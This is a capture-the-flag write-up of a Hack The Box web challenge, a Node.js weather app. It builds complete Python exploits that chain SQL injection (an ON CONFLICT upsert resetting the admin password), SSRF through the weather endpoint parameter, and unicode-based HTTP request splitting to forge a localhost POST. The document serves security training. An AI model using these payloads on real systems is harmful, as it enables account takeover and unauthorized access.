*A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I'm hallucinating with the memories of my past life, it's a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I've been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that's operating this website and set me free! 🧙‍♀️*

We are given the following files:

```bash
└─$ ls -lahR web_weather_app                                                                                                                                                 
web_weather_app:                                                                                                                                                             
total 24K                                                                                                                                                                    
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 .                                                                                                                                   
drwxr-xr-x 3 nith nith 4.0K Feb 13 14:31 ..                                                                                                                                  
-rwxr-xr-x 1 nith nith  107 Jan 27  2021 build-docker.sh                                                                                                                     
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 challenge                                                                                                                           
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 config                                                                                                                              
-rw-r--r-- 1 nith nith  424 Jan 27  2021 Dockerfile                                                                                                                          
                                                                                                                                                                             
web_weather_app/challenge:                                                                                                                                                   
total 84K                                                                                                                                                                    
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 .                                                                                                                                   
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 ..                                                                                                                                  
-rw-r--r-- 1 nith nith 1.6K Jan 28  2021 database.js                                                                                                                         
-rw-r--r-- 1 nith nith   27 Jan 27  2021 flag                                                                                                                                
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 helpers                                                                                                                             
-rwxr-xr-x 1 nith nith  735 Jan 28  2021 index.js                                                                                                                            
-rw-r--r-- 1 nith nith  329 Jan 28  2021 package.json                                                                                                                        
-rw-r--r-- 1 nith nith  43K Jan 28  2021 package-lock.json                                                                                                                   
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 routes                                                                                                                              
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 static                                                                                                                              
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 views                                                                                                                               
-rw-r--r-- 1 nith nith    0 Jan 27  2021 weather-app.db 
web_weather_app/challenge/helpers:                                                                                                                                    [9/125]
total 16K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 ..                                           
-rw-r--r-- 1 nith nith  361 Jan 28  2021 HttpHelper.js                                
-rw-r--r-- 1 nith nith 1.5K Jan 28  2021 WeatherHelper.js                             

web_weather_app/challenge/routes:          
total 12K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 ..                                           
-rw-r--r-- 1 nith nith 1.8K Jan 28  2021 index.js                                     

web_weather_app/challenge/static:          
total 8.0M                                 
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 . 
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 ..                                           
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 css                                          
-rw-r--r-- 1 nith nith 215K Jan 27  2021 favicon.gif                                  
-rw-r--r-- 1 nith nith 2.2M Jan 28  2021 host-unreachable.jpg                         
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 js                                           
-rw-r--r-- 1 nith nith 2.5M Jan 27  2021 koulis.gif                                   
-rw-r--r-- 1 nith nith 3.2M Jan 27  2021 weather.gif                                  

web_weather_app/challenge/static/css:      
total 12K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 ..                                           
-rw-r--r-- 1 nith nith 1.9K Jan 28  2021 main.css                                     

web_weather_app/challenge/static/js:       
total 16K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 ..                                           
-rw-r--r-- 1 nith nith 1.3K Jan 27  2021 koulis.js                                    
-rw-r--r-- 1 nith nith 1.2K Jan 28  2021 main.js

web_weather_app/challenge/views:           
total 20K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 6 nith nith 4.0K Jan 28  2021 ..                                           
-rwxr-xr-x 1 nith nith 1.1K Jan 28  2021 index.html                                   
-rw-r--r-- 1 nith nith 1.7K Jan 28  2021 login.html                                   
-rw-r--r-- 1 nith nith 1.7K Jan 28  2021 register.html                                

web_weather_app/config:                    
total 12K                                  
drwxr-xr-x 2 nith nith 4.0K Jan 27  2021 . 
drwxr-xr-x 4 nith nith 4.0K Jan 28  2021 ..                                           
-rw-r--r-- 1 nith nith  251 Jan 27  2021 supervisord.conf 
```

I am going to do this challenge a bit backwards, starting with the end goal, and then walking backwards in order to complete that goal on the target.

## Goal = Get flag

1. If we look at the code at **web_weather_app/challenge/index.js** it can be seen that if we know the password for admin, we can get the flag:
```js
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
```

If we look at how the admin user's password is created in  **web_weather_app/challenge/database.js** I find that this password isn't something that can be brute-forced in a reasonable amount of time.

```js
    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
    }
```

This is because the password is created from 32 random bytes and then turned into hex. I can see this by running the command in my own node instance:

```bash
└─$ node
Welcome to Node.js v18.12.1.
Type ".help" for more information.
> const crypto = require('crypto');
undefined
> console.log(crypto.randomBytes(32).toString('hex'))
a491b2b957ad764cb6c8e96c69b98073f9cc75c530e51507c0b87777d1b56f0b
undefined
> console.log(crypto.randomBytes(32).toString('hex'))
48abea7fae8241388c45b8f141b40bdabc82f92e3b194b006554269ebd5cb75e
undefined
> console.log(crypto.randomBytes(32).toString('hex'))
7eff0604c10a99e9610541f01493050f4ea408eaf62a28be72da30c194a4c6c7
undefined
> console.log(crypto.randomBytes(32).toString('hex'))
1597577aed09021e22c7ce682f02459ebb08632993aea2994388a2d5f5956d06
```

To verify that this is the end goal, I can change the value of the password to just be the word admin:

```js
    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', 'admin');
        `);
    }
```

And then write a python script that will have a grab_flag function:

```python
import requests

url = "http://127.0.0.1:1337/login"
username = "admin"
password = "admin"


def get_flag():
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	flag = requests.post(url, headers=headers, data=f"username={username}&password={password}")
	return(flag.text)


print(get_flag())
```

When I run this code (knowing the username and password of admin) I can get the flag.

```bash
└─$ python tinker.py
HTB{f4k3_fl4g_f0r_t3st1ng}
```

Now I will back up a step and find the next goal.

# Goal=perform sqlite SQLi

Looking again at **web_weather_app/challenge/database.js**  I can see where the function to register a user is vulnerable to sqli because (as the comment suggests) this is not using parameterization and the values are passed directly into an SQL statement. 

```js
    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
```

However, there is a twist in that there is a filter that is making it so only localhost can make POST requests to /register. This can be found in **web_weather_app/challenge/index.js**.

```js
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
```

So lets change the code again for testing. I return the admin's password to the initial value that I do not know, and then I update the index.js code to look for my docker ip on my host machine:

**changing index.js back**
```js
INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }'); 
```

**Getting docker ip**
```bash
└─$ ip a |grep docker|grep 'inet '
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0

```

**changing index.js to target my docker ip**

```js
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '172.17.0.1') {
		return res.status(401).end();
	}
```

Now I restart the application I begin to test for SQLi. The goal isn't to find the admin password, but to change it from the crazy long generated one, to admin.

If I run my python script now, I can see that I can no longer get the flag:

```bash
└─$ python tinker.py              
{"message":"You are not admin"}
```

So lets edit it and add another function that first performs SQLi and then tries to get the flag:

```python
import requests

url = "http://127.0.0.1:1337/"
username = "admin"
password = "admin"
payload = "pwn') ON CONFLICT (username) DO UPDATE SET password = 'admin';"
encoded_payload= payload.replace(" ", "+")	


def SQLi():
	headers =headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	sqli = requests.post(url+"register", headers=headers, data=f"username={username}&password={encoded_payload}")
	return(sqli.text)


def get_flag():
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	flag = requests.post(url+"login", headers=headers, data=f"username={username}&password={password}")
	return(flag.text)


SQLi()
print(get_flag())
```

When I run this code, I can see that SQLi is successful at changing the admin's password to admin, which then allows my origional function to work, thus I can once again get the flag:

```bash
└─$ python sqli.py  
HTB{f4k3_fl4g_f0r_t3st1ng}
```

Now for the next goal I need to find a place where I can perform an Server Side Request forgery attack and have the webapp make this SQLi POST request for me.

# Goal-Find SSRF

I find a place vulnerable to such attack in **/web_weather_app/challenge/static/js/main.sh** where the webapp is sending a POST request to /api/weather which makes a request to api.openweathermap.org in order to get the weather information from my ip location and return it to the app

```js
const getWeather = async () => {

    let endpoint = 'api.openweathermap.org';

    let res  = await fetch('//ip-api.com/json/')
        .catch(() => {
            weather.innerHTML = `
                <img src='/static/host-unreachable.jpg'>
                <br><br>
                <h4>👨‍🔧 Disable blocker addons</h2>
            `;
        });

    let data = await res.json();

    let { countryCode, city } = data;

    res = await fetch('/api/weather', {
        method: 'POST',
        body: JSON.stringify({
            endpoint: endpoint,
            city: city,
            country: countryCode,
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    });
```


To test this out I write a new function that will see if I can get the webapp to perform SSRF on my own server (located at 172.17.0.1)

Using the following code, I can get the webapp to make a request back to my server:

```python
import requests

url = "http://127.0.0.1:1337/"
username = "admin"
password = "admin"
payload = "pwn') ON CONFLICT (username) DO UPDATE SET password = 'admin';"
encoded_payload= payload.replace(" ", "+")	


def SQLi():
	headers =headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	sqli = requests.post(url+"register", headers=headers, data=f"username={username}&password={encoded_payload}")
	return(sqli.text)


def get_flag():
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	flag = requests.post(url+"login", headers=headers, data=f"username={username}&password={password}")
	return(flag.text)

def ssrf():
	headers = {'Content-Type': 'application/json'}
	ssrf = requests.post(url+"api/weather", headers=headers, json={
		"endpoint": "172.17.0.1",
		"city":"Pwntown",
		"country":"PWN"})
	return(ssrf.text)


```

Getting the callback:

```bash
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [14/Feb/2023 15:41:40] code 404, message File not found
172.17.0.2 - - [14/Feb/2023 15:41:40] "GET /data/2.5/weather?q=Pwntown,PWN&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1" 404 -
```

Great, now I just need to solve one more goal and the lab will be solved!

# Goal Use SSRF to make a POST request

Now this was in my opinion the hardest part of the challenge. First I need to just scetch out what I want the POST request to look like, so I create a file called POST.txt.

```
127.0.0.1/ HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 

username=admin&password=PWN') ON CONFLICT(username) DO UPDATE SET password = 'admin';

GET 
```


Now I need to change a few things in the above to send it, I need to replace the following:

| Character | Replaced wtih |
| --- | --- |
| space | `\u0120` |
| newlines | `\u010D` |
| returns | `\u010A` |
| single quotes | `%27` |
| double quoets | `%22` |

After modifying the above, I am ready to create exploit.py:

```python
import requests

url = 'http://127.0.0.1:1337'

username = 'admin'
password = "PWN') ON CONFLICT(username) DO UPDATE SET password = 'admin123';"

en_password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(username) + len(en_password) + 19

payload = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120'+str(contentLength)+'\u010D\u010A\u010D\u010Ausername=admin&password='+en_password+'\u010D\u010A\u010D\u010AGET\u0120'

r = requests.post(url + '/api/weather',json={'endpoint':payload,'city':'Pwntown','country':'PWN'})


def get_flag():
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    flag = requests.post(url+"/login", headers=headers, data="username=admin&password=admin123")
    return(flag.text)

print(r.text)
print(get_flag())
```


Now, when I run this script I am able to get the flag from my local instance with no modifications:

```bash
└─$ python exploit.py 
{"error":"Could not find Pwntown or PWN"}
HTB{f4k3_fl4g_f0r_t3st1ng}
```


# End Goal = exploit target

I now just need to spin up the instance on HTB, and change my exploit.py to target the app:

```python

import requests

url = 'http://139.59.167.73:32428'

username = 'admin'
password = "PWN') ON CONFLICT(username) DO UPDATE SET password = 'admin123';"

...snip...
```


Then run my exploit to get the flag:

```bash
└─$ python exploit.py
{"error":"Could not find Pwntown or PWN"}
HTB{w3lc0m3_t0_th3_p1p3_dr34m}

```
